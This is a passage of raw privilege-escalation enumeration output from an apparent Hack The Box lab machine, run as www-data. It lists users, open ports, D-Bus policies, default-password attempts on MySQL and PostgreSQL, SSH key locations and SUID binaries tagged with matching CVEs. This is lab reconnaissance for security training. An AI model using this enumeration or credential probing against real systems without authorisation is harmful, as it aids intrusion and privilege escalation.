24min ago snapd.refresh.timer snapd.refresh.service\rFri 2023-05-05 16:45:36 EEST 5h 36min left Fri 2023-05-05 04:50:55 EEST 6h ago apt-daily.timer apt-daily.service\rSat 2023-05-06 05:06:00 EEST 17h left Fri 2023-05-05 05:06:00 EEST 6h ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service\rn/a n/a n/a n/a ureadahead-stop.timer ureadahead-stop.service\r[+] Analyzing .timer files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers [+] Analyzing .socket files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets [+] HTTP sockets\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets [+] D-Bus config files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf ( \u0026lt;policy user=\u0026#34;dnsmasq\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf ( \u0026lt;policy user=\u0026#34;systemd-network\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf ( \u0026lt;policy user=\u0026#34;systemd-resolve\u0026#34;\u0026gt;)\r[+] D-Bus Service Objects list\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus NAME PID PROCESS USER CONNECTION UNIT SESSION DESCRIPTION :1.0 1 systemd root :1.0 init.scope - - :1.1 952 systemd-logind root :1.1 systemd-logind.service - - :1.171 25101 busctl www-data :1.171 apache2.service - - :1.2 942 accounts-daemon root :1.2 accounts-daemon.service - - :1.3 1016 polkitd root :1.3 polkitd.service - - com.ubuntu.LanguageSelector - - - (activatable) - - com.ubuntu.SoftwareProperties - - - (activatable) - - org.freedesktop.Accounts 942 accounts-daemon root :1.2 accounts-daemon.service - - org.freedesktop.DBus 964 dbus-daemon messagebus org.freedesktop.DBus dbus.service - - org.freedesktop.PolicyKit1 1016 polkitd root :1.3 polkitd.service - - org.freedesktop.hostname1 - - - (activatable) - - org.freedesktop.locale1 - - - (activatable) - - org.freedesktop.login1 952 systemd-logind root :1.1 systemd-logind.service - - org.freedesktop.network1 - - - (activatable) - - org.freedesktop.resolve1 - - - (activatable) - - org.freedesktop.systemd1 1 systemd root :1.0 init.scope - - org.freedesktop.timedate1 - - - (activatable) - - ═══════════════════════════════════╣ Network Information ╠════════════════════════════════════ [+] Hostname, hosts and DNS cronos 127.0.0.1 localhost\r127.0.1.1 cronos.hackthebox.gr cronos\r::1 localhost ip6-localhost ip6-loopback\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\rnameserver 1.1.1.1\rnameserver 8.8.8.8\rhackthebox.gr\r[+] Content of /etc/inetd.conf \u0026amp; /etc/xinetd.conf\r/etc/inetd.conf Not Found [+] Interfaces\r# symbolic names for networks, see networks(5) for more information link-local 169.254.0.0\rens160 Link encap:Ethernet HWaddr 00:50:56:b9:f5:d0 inet addr:10.129.227.211 Bcast:10.129.255.255 Mask:255.255.0.0\rinet6 addr: dead:beef::250:56ff:feb9:f5d0/64 Scope:Global\rinet6 addr: fe80::250:56ff:feb9:f5d0/64 Scope:Link\rUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\rRX packets:1034325 errors:0 dropped:0 overruns:0 frame:0\rTX packets:1030718 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:1000 RX bytes:148011005 (148.0 MB) TX bytes:435868863 (435.8 MB)\rlo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0\rinet6 addr: ::1/128 Scope:Host\rUP LOOPBACK RUNNING MTU:65536 Metric:1\rRX packets:547 errors:0 dropped:0 overruns:0 frame:0\rTX packets:547 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:1 RX bytes:48038 (48.0 KB) TX bytes:48038 (48.0 KB)\r[+] Networks and neighbours\rKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface\rdefault 10.129.0.1 0.0.0.0 UG 0 0 0 ens160\r10.129.0.0 * 255.255.0.0 U 0 0 0 ens160\rAddress HWtype HWaddress Flags Mask Iface\r10.129.0.1 ether 00:50:56:b9:ac:f1 C ens160\r[+] Iptables rules\riptables rules Not Found [+] Active Ports\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 10.129.227.211:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:953 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - [+] Can I sniff with tcpdump?\rNo ════════════════════════════════════╣ Users Information ╠════════════════════════════════════ [+] My user [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users uid=33(www-data) gid=33(www-data) groups=33(www-data) [+] Do I have PGP keys?\r/usr/bin/gpg netpgpkeys Not Found\rnetpgp Not Found [+] Clipboard or highlighted text?\rxsel and xclip Not Found [+] Checking \u0026#39;sudo -l\u0026#39;, /etc/sudoers, and /etc/sudoers.d\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid [+] Checking sudo tokens\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens /proc/sys/kernel/yama/ptrace_scope is not enabled (1) gdb wasn\u0026#39;t found in PATH\r[+] Checking doas.conf\r/etc/doas.conf Not Found [+] Checking Pkexec policy\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2 [Configuration]\rAdminIdentities=unix-user:0\r[Configuration]\rAdminIdentities=unix-group:sudo;unix-group:admin\r[+] Superusers\rroot:x:0:0:root:/root:/bin/bash [+] Users with console\rnoulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash root:x:0:0:root:/root:/bin/bash\rwww-data:x:33:33:www-data:/var/www:/bin/bash\r[+] All users \u0026amp; groups\ruid=0(root) gid=0(root) groups=0(root) uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)\ruid=10(uucp) gid=10(uucp) groups=10(uucp)\ruid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)\ruid=1000(noulis) gid=1000(noulis) groups=1000(noulis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)\ruid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)\ruid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)\ruid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)\ruid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)\ruid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)\ruid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)\ruid=107(mysql) gid=111(mysql) groups=111(mysql)\ruid=108(messagebus) gid=112(messagebus) groups=112(messagebus)\ruid=109(uuidd) gid=113(uuidd) groups=113(uuidd)\ruid=110(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)\ruid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)\ruid=112(bind) gid=119(bind) groups=119(bind)\ruid=13(proxy) gid=13(proxy) groups=13(proxy)\ruid=2(bin) gid=2(bin) groups=2(bin)\ruid=3(sys) gid=3(sys) groups=3(sys)\ruid=33(www-data) gid=33(www-data) groups=33(www-data)\ruid=34(backup) gid=34(backup) groups=34(backup)\ruid=38(list) gid=38(list) groups=38(list)\ruid=39(irc) gid=39(irc) groups=39(irc)\ruid=4(sync) gid=65534(nogroup) groups=65534(nogroup)\ruid=41(gnats) gid=41(gnats) groups=41(gnats)\ruid=5(games) gid=60(games) groups=60(games)\ruid=6(man) gid=12(man) groups=12(man)\ruid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\ruid=7(lp) gid=7(lp) groups=7(lp)\ruid=8(mail) gid=8(mail) groups=8(mail)\ruid=9(news) gid=9(news) groups=9(news)\r[+] Login now\r11:09:32 up 6:18, 0 users, load average: 0.17, 0.11, 0.04 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT\r[+] Last logons\rwtmp begins Fri May 5 06:25:02 2023\r[+] Last time logon each user\rUsername Port From Latest root tty1 Fri Jun 17 16:02:44 +0300 2022\rnoulis pts/0 10.10.14.141 Thu Jul 27 01:39:12 +0300 2017\r[+] Password policy\rPASS_MAX_DAYS 99999 PASS_MIN_DAYS 0\rPASS_WARN_AGE 7\rENCRYPT_METHOD SHA512\r[+] Do not forget to test \u0026#39;su\u0026#39; as any other user with shell: without password and with their names as password (I can\u0026#39;t do it...) [+] Do not forget to execute \u0026#39;sudo -l\u0026#39; without password or with valid password (if you know it)!! ═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════ [+] MySQL version mysql Ver 14.14 Distrib 5.7.17, for Linux (x86_64) using EditLine wrapper [+] MySQL connection using default root/root ........... No\r[+] MySQL connection using root/toor ................... No [+] MySQL connection using root/NOPASS ................. No [+] Searching mysql credentials and exec From \u0026#39;/etc/mysql/mysql.conf.d/mysqld.cnf\u0026#39; Mysql user: user = mysql Found readable /etc/mysql/my.cnf\r!includedir /etc/mysql/conf.d/\r!includedir /etc/mysql/mysql.conf.d/\r[+] PostgreSQL version and pgadmin credentials\rNot Found [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No\r[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No [+] Apache server info\rVersion: Server version: Apache/2.4.18 (Ubuntu) Server built: 2016-07-14T12:32:26\r/etc/apache2/sites-enabled/admin.conf:ServerName admin.cronos.htb\r/etc/apache2/sites-enabled/laravel.conf:ServerName cronos.htb\r/etc/apache2/sites-enabled/laravel.conf:ServerAlias www.cronos.htb\rPHP exec extensions\r/etc/apache2/mods-enabled/php7.0.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(p[3457]?|t|tml)$\u0026#34;\u0026gt;\r/etc/apache2/mods-enabled/php7.0.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/mods-enabled/php7.0.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt;\r/etc/apache2/mods-enabled/php7.0.conf: SetHandler application/x-httpd-php-source\r--\r/etc/apache2/mods-available/php7.0.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(p[3457]?|t|tml)$\u0026#34;\u0026gt;\r/etc/apache2/mods-available/php7.0.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/mods-available/php7.0.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt;\r/etc/apache2/mods-available/php7.0.conf: SetHandler application/x-httpd-php-source\r[+] Searching PHPCookies\rNot Found [+] Searching Wordpress wp-config.php files\rwp-config.php Not Found [+] Searching Drupal settings.php files\r/default/settings.php Not Found [+] Searching Moodle config.php files\rconfig.php inside a moodle folder Not Found [+] Searching Tomcat users file\rtomcat-users.xml Not Found [+] Mongo information\rmongo binary Not Found [+] Searching supervisord configuration file\rsupervisord.conf Not Found [+] Searching cesi configuration file\rcesi.conf Not Found [+] Searching Rsyncd config file\rrsyncd.conf Not Found [+] Searching Hostapd config file hostapd.conf Not Found [+] Searching wifi conns file\rNot Found [+] Searching Anaconda-ks config files\ranaconda-ks.cfg Not Found [+] Searching .vnc directories and their passwd files\r.vnc Not Found [+] Searching ldap directories and their hashes\r/etc/ldap The password hash is from the {SSHA} to \u0026#39;structural\u0026#39;\r[+] Searching .ovpn files and credentials\r.ovpn Not Found [+] Searching ssl/ssh files\rPort 22 PermitRootLogin prohibit-password\rPubkeyAuthentication yes\rPermitEmptyPasswords no\rChallengeResponseAuthentication no\rUsePAM yes\rPossible private SSH keys were found!\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt2.key\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/intermediate.key /var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/ca.key\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign2.key\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt.key\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign.key\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/dkim/dkim.test.priv\r--\u0026gt; /etc/hosts.allow file found, read the rules:\r/etc/hosts.allow\rSearching inside /etc/ssh/ssh_config for interesting info\rHost *\rSendEnv LANG LC_*\rHashKnownHosts yes\rGSSAPIAuthentication yes\rGSSAPIDelegateCredentials no\r[+] Searching unexpected auth lines in /etc/pam.d/sshd\rNo [+] Searching Cloud credentials (AWS, Azure, GC)\r[+] NFS exports?\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe /etc/exports Not Found [+] Searching kerberos conf files and tickets\r[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt tickets kerberos Not Found klist Not Found [+] Searching Kibana yaml\rkibana.yml Not Found [+] Searching Knock configuration\rKnock.config Not Found [+] Searching logstash files\rNot Found [+] Searching elasticsearch files\rNot Found [+] Searching Vault-ssh files\rvault-ssh-helper.hcl Not Found [+] Searching AD cached hashes\rcached hashes Not Found [+] Searching screen sessions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions No Sockets found in /var/run/screen/S-www-data. [+] Searching tmux sessions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions tmux Not Found [+] Searching Couchdb directory\r[+] Searching redis.conf\r[+] Searching dovecot files\rdovecot credentials Not Found [+] Searching mosquitto.conf\r[+] Searching neo4j auth file\r[+] Searching Cloud-Init conf file\r[+] Searching Erlang cookie file\r[+] Searching GVM auth file\r[+] Searching IPSEC files\r[+] Searching IRSSI files\r[+] Searching Keyring files\rKeyring folder: /usr/share/keyrings /usr/share/keyrings:\rtotal 24\r-rw-r--r-- 1 root root 12335 May 19 2012 ubuntu-archive-keyring.gpg\r-rw-r--r-- 1 root root 0 May 19 2012 ubuntu-archive-removed-keys.gpg\r-rw-r--r-- 1 root root 0 Nov 11 2013 ubuntu-cloudimage-keyring-removed.gpg\r-rw-r--r-- 1 root root 2294 Nov 11 2013 ubuntu-cloudimage-keyring.gpg\r-rw-r--r-- 1 root root 1227 May 19 2012 ubuntu-master-keyring.gpg\rKeyring folder: /var/lib/apt/keyrings\r/var/lib/apt/keyrings:\rtotal 16\r-rw-r--r-- 1 root root 12335 Feb 15 2017 ubuntu-archive-keyring.gpg\r[+] Searching Filezilla sites file\r[+] Searching backup-manager files\r[+] Searching uncommon passwd files (splunk)\r[+] Searching GitLab related files\r[+] Searching PGP/GPG\rPGP/GPG software: /usr/bin/gpg\rnetpgpkeys Not Found\rnetpgp Not Found [+] Searching vim files\r[+] Checking if containerd(ctr) is available\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation [+] Checking if runc is available\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation [+] Searching docker files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket [+] Interesting Firefox Files\r[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Interesting Chrome Files\r[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Autologin Files\r[+] S/Key authentication\r[+] YubiKey authentication\r[+] Passwords inside pam.d\r[+] FastCGI Params\r[+] SNMPs\r════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping\r-rwsr-sr-x 1 daemon daemon 51K Jan 15 2016 /usr/bin/at ---\u0026gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 15K Jan 18 2016 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 23K Jan 18 2016 /usr/bin/pkexec ---\u0026gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) -rwsr-xr-x 1 root root 53K Mar 29 2016 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 74K Mar 29 2016 /usr/bin/gpasswd\r-rwsr-xr-x 1 root root 40K Mar 29 2016 /usr/bin/chsh\r-rwsr-xr-x 1 root root 49K Mar 29 2016 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10\r-rwsr-xr-x 1 root root 39K Mar 29 2016 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 40K Mar 29 2016 /bin/su\r-rwsr-xr-x 1 root root 33K Mar 29 2016 /usr/bin/newuidmap\r-rwsr-xr-x 1 root root 33K Mar 29 2016 /usr/bin/newgidmap\r-rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount\r-rwsr-xr-x 1 root root 419K Aug 11 2016 /usr/lib/openssh/ssh-keysign\r-rwsr-xr-x 1 root root 27K Dec 16 2016 /bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 40K Dec 16 2016 /bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-- 1 root messagebus 42K Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 134K Jan 20 2017 /usr/bin/sudo\r-rwsr-xr-x 1 root root 139K Jan 28 2017 /bin/ntfs-3g ---\u0026gt; Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017) -rwsr-xr-x 1 root root 56K Feb 24 2017 /usr/lib/snapd/snap-confine\r-rwsr-xr-x 1 root root 39K Mar 7 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -rwsr-xr-x 1 root root 10K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device\r[+] SGID\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwxr-sr-x 1 root mlocate 39K Nov 18 2014 /usr/bin/mlocate -rwsr-sr-x 1 daemon daemon 51K Jan 15 2016 /usr/bin/at\r-rwxr-sr-x 1 root utmp 425K Feb 7 2016 /usr/bin/screen\r-rwxr-sr-x 1 root tty 15K Mar 1 2016 /usr/bin/bsd-write\r-rwxr-sr-x 1 root utmp 10K Mar 11 2016 /usr/lib/x86_64-linux-gnu/utempter/utempter -rwxr-sr-x 1 root shadow 35K Mar 16 2016 /sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 35K Mar 16 2016 /sbin/pam_extrausers_chkpwd\r-rwxr-sr-x 1 root shadow 23K Mar 29 2016 /usr/bin/expiry\r-rwxr-sr-x 1 root shadow 61K Mar 29 2016 /usr/bin/chage\r-rwxr-sr-x 1 root crontab 36K Apr 6 2016 /usr/bin/crontab\r-rwxr-sr-x 1 root ssh 351K Aug 11 2016 /usr/bin/ssh-agent\r-rwxr-sr-x 1 root tty 27K Dec 16 2016 /usr/bin/wall\r[+] Checking misconfigurations of ld.so\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so /etc/ld.so.conf include /etc/ld.so.conf.d/*.conf\r/etc/ld.so.conf.d\r/etc/ld.so.conf.d/libc.conf\r/usr/local/lib\r/etc/ld.so.conf.d/x86_64-linux-gnu.conf\r/lib/x86_64-linux-gnu\r/usr/lib/x86_64-linux-gnu\r[+] Capabilities\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities Current capabilities: Current: =\rCapInh: 0000000000000000\rCapPrm: 0000000000000000\rCapEff: 0000000000000000\rCapBnd: 0000003fffffffff\rCapAmb: 0000000000000000\rShell capabilities:\r0x0000000000000000=\rCapInh: 0000000000000000\rCapPrm: 0000000000000000\rCapEff: 0000000000000000\rCapBnd: 0000003fffffffff\rCapAmb: 0000000000000000\rFiles with capabilities:\r/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep\r/usr/bin/mtr = cap_net_raw+ep\r/usr/bin/traceroute6.iputils = cap_net_raw+ep\r[+] Users with capabilities\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities /etc/security/capability.conf Not Found [+] Files with ACLs\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls files with acls in searched folders Not Found [+] .sh files in path\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path /usr/bin/gettext.sh [+] Unexpected in root\r/vmlinuz /initrd.img.old\r/initrd.img\r/vmlinuz.old\r/lost+found\r[+] Files (scripts) in /etc/profile.d/\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files total 24 drwxr-xr-x 2 root root 4096 May 10 2022 .\rdrwxr-xr-x 95 root root 4096 Jun 17 2022 ..\r-rw-r--r-- 1 root root 1557 Apr 14 2016 Z97-byobu.sh\r-rw-r--r-- 1 root root 101 Jan 14 2017 apps-bin-path.sh\r-rw-r--r-- 1 root root 663 May 18 2016 bash_completion.sh\r-rw-r--r-- 1 root root 1003 Dec 29 2015 cedilla-portuguese.sh\r[+] Permissions in init, init.d, systemd, and rc.d\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d [+] Hashes inside passwd file? ........... No\r[+] Writable passwd file? ................ No [+] Credentials in fstab/mtab? ........... No [+] Can I read shadow files? ............. No [+] Can I read opasswd file? ............. No [+] Can I write in network-scripts? ...... No [+] Can I read root folder? .............. No [+] Searching root files in home dirs (limit 30)\r/home/ /home/noulis/.composer\r/home/noulis/.composer/keys.tags.pub\r/home/noulis/.composer/.htaccess\r/home/noulis/.composer/cache\r/home/noulis/.composer/cache/files\r/home/noulis/.composer/cache/files/mockery\r/home/noulis/.composer/cache/files/mockery/mockery\r/home/noulis/.composer/cache/files/mockery/mockery/f30d894582b8b548b641819cd37c4cfc11d5b315.zip\r/home/noulis/.composer/cache/files/tijsverkoyen\r/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles\r/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles/b52e5b78653e57b3b07937c1f84109ac7f77e5e0.zip\r/home/noulis/.composer/cache/files/sebastian\r/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup\r/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup/9fdb38e356a0265a2dd6b64495413906b9366038.zip\r/home/noulis/.composer/cache/files/sebastian/resource-operations\r/home/noulis/.composer/cache/files/sebastian/resource-operations/fd2c0f591ee5fee7aa3eb70f20a1d64c1dc26e8d.zip\r/home/noulis/.composer/cache/files/sebastian/diff\r/home/noulis/.composer/cache/files/sebastian/diff/d845e8b0ee3d707d4b13b9febac4e7a0e8b22fe5.zip\r/home/noulis/.composer/cache/files/sebastian/global-state\r/home/noulis/.composer/cache/files/sebastian/global-state/a0ef5bf736af85b66572f9ed232aa35c18fe5fb7.zip\r/home/noulis/.composer/cache/files/sebastian/exporter\r/home/noulis/.composer/cache/files/sebastian/exporter/81e14d73852681aabe5c5a9d8be1ef2045a9170a.zip\r/home/noulis/.composer/cache/files/sebastian/comparator\r/home/noulis/.composer/cache/files/sebastian/comparator/bdc0b01e0827c360d54386fe60dfc6bd65168f80.zip\r/home/noulis/.composer/cache/files/sebastian/version\r/home/noulis/.composer/cache/files/sebastian/version/c315a200d32565a6d8ebb3495cb5ae34c5ced3c8.zip\r/home/noulis/.composer/cache/files/sebastian/environment\r/home/noulis/.composer/cache/files/sebastian/environment/72b70c30c0946406c4562db7b7c647d084a87e12.zip\r/home/noulis/.composer/cache/files/sebastian/recursion-context\r[+] Searching folders owned by me containing others files on it\r[+] Readable files belonging to root and readable by me but not world readable\r[+] Modified interesting files in the last 5mins (limit 100)\r/var/log/syslog /var/log/kern.log\r/var/log/auth.log\r[+] Writable log files (logrotten) (limit 100)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation [+] Files inside /home/www-data (limit 20)\r[+] Files inside others home (limit 20)\r/home/noulis/user.txt /home/noulis/.bashrc\r/home/noulis/.bash_logout\r/home/noulis/.profile\r/home/noulis/.composer/keys.tags.pub\r/home/noulis/.composer/.htaccess\r/home/noulis/.composer/cache/files/mockery/mockery/f30d894582b8b548b641819cd37c4cfc11d5b315.zip\r/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles/b52e5b78653e57b3b07937c1f84109ac7f77e5e0.zip\r/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup/9fdb38e356a0265a2dd6b64495413906b9366038.zip\r/home/noulis/.composer/cache/files/sebastian/resource-operations/fd2c0f591ee5fee7aa3eb70f20a1d64c1dc26e8d.zip\r/home/noulis/.composer/cache/files/sebastian/diff/d845e8b0ee3d707d4b13b9febac4e7a0e8b22fe5.zip\r/home/noulis/.composer/cache/files/sebastian/global-state/a0ef5bf736af85b66572f9ed232aa35c18fe5fb7.zip\r/home/noulis/.composer/cache/files/sebastian/exporter/81e14d73852681aabe5c5a9d8be1ef2045a9170a.zip\r/home/noulis/.composer/cache/files/sebastian/comparator/bdc0b01e0827c360d54386fe60dfc6bd65168f80.zip\r/home/noulis/.composer/cache/files/sebastian/version/c315a200d32565a6d8ebb3495cb5ae34c5ced3c8.zip\r/home/noulis/.composer/cache/files/sebastian/environment/72b70c30c0946406c4562db7b7c647d084a87e12.zip\r/home/noulis/.composer/cache/files/sebastian/recursion-context/82276e6cc560a972510bb0c2dc0aa78fa4701777.zip\r/home/noulis/.composer/cache/files/sebastian/object-enumerator/d91a189f317ea2b63ee8e5e2431bc67cc35b0468.zip\r/home/noulis/.composer/cache/files/nikic/php-parser/f2f709eb0b0befba56b7e0159b9e68a4d9a18afe.zip\r/home/noulis/.composer/cache/files/hamcrest/hamcrest-php/d75f61f87d41a4185b72f63a94ca55ed8a49d489.zip\rgrep: write error: Broken pipe\r[+] Searching installed mail applications\r[+] Mails (limit 50)\r[+] Backup folders\rdrwxr-xr-x 2 root root 4096 May 5 06:25 /var/backups total 756\r-rw-r--r-- 1 root root 40960 May 5 06:25 alternatives.tar.0\r-rw-r--r-- 1 root root 2152 Mar 23 2017 alternatives.tar.1.gz\r-rw-r--r-- 1 root root 7117 Apr 9 2017 apt.extended_states.0\r-rw-r--r-- 1 root root 746 Mar 22 2017 apt.extended_states.1.gz\r-rw-r--r-- 1 root root 11 Mar 22 2017 dpkg.arch.0\r-rw-r--r-- 1 root root 43 Mar 22 2017 dpkg.arch.1.gz\r-rw-r--r-- 1 root root 437 Mar 22 2017 dpkg.diversions.0\r-rw-r--r-- 1 root root 202 Mar 22 2017 dpkg.diversions.1.gz\r-rw-r--r-- 1 root root 207 Mar 22 2017 dpkg.statoverride.0\r-rw-r--r-- 1 root root 171 Mar 22 2017 dpkg.statoverride.1.gz\r-rw-r--r-- 1 root root 526336 May 10 2022 dpkg.status.0\r-rw-r--r-- 1 root root 143460 Mar 22 2017 dpkg.status.1.gz\r-rw------- 1 root root 832 Apr 9 2017 group.bak\r-rw------- 1 root shadow 699 Apr 9 2017 gshadow.bak\r-rw------- 1 root root 1667 Apr 9 2017 passwd.bak\r-rw------- 1 root shadow 1191 Apr 9 2017 shadow.bak\rdrwx------ 2 root root 4096 May 10 2022 /etc/lvm/backup\r[+] Backup files\r-rw-r--r-- 1 root root 8710 Mar 3 2017 /lib/modules/4.4.0-66-generic/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 8990 Mar 3 2017 /lib/modules/4.4.0-66-generic/kernel/drivers/power/wm831x_backup.ko\r-rw-r--r-- 1 root root 8710 Jan 18 2017 /lib/modules/4.4.0-62-generic/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 8990 Jan 18 2017 /lib/modules/4.4.0-62-generic/kernel/drivers/power/wm831x_backup.ko\r-rw-r--r-- 1 root root 8710 Mar 31 2017 /lib/modules/4.4.0-72-generic/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 8990 Mar 31 2017 /lib/modules/4.4.0-72-generic/kernel/drivers/power/wm831x_backup.ko\r-rw-r--r-- 1 root root 128 Mar 22 2017 /var/lib/sgml-base/supercatalog.old\r-rw-r--r-- 1 root root 20 Feb 9 2017 /etc/vmware-tools/tools.conf.old\r-rw-r--r-- 1 root root 673 Mar 22 2017 /etc/xml/xml-core.xml.old\r-rw-r--r-- 1 root root 610 Mar 22 2017 /etc/xml/catalog.old\r-rw-r--r-- 1 root root 190058 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/.config.old\r-rw-r--r-- 1 root root 0 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/net/team/mode/activebackup.h\r-rw-r--r-- 1 root root 0 Jan 18 2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/wm831x/backup.h\r-rw-r--r-- 1 root root 190258 Mar 3 2017 /usr/src/linux-headers-4.4.0-66-generic/.config.old\r-rw-r--r-- 1 root root 0 Mar 3 2017 